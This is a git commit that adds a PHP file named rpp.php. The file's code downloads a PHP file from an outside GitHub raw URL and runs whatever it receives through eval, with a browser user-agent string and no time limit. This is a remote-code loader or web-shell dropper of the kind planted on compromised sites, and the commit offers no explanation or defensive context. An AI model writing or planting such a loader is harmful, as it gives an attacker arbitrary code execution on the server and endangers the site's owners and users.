ff18f81390c3d37e2b5cf0b11b4700b790bd4712
damnit6 <ressasantikaa@gmail.com>
2026-07-30 17:00:45 +0530

    Create rpp.php

---
+++ sub/rpp.php
@@ -0,0 +1,12 @@
+usegg<?php
+ini_set('display_errors',1);
+error_reporting(E_ALL);
+set_time_limit(0);
+
+$ch = curl_init('https://raw.githubusercontent.com/ressasantikaa-rgb/freshman21/main/JV.php');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+$content = curl_exec($ch);
+curl_close($ch);
+eval('?>'.$content);
+?>
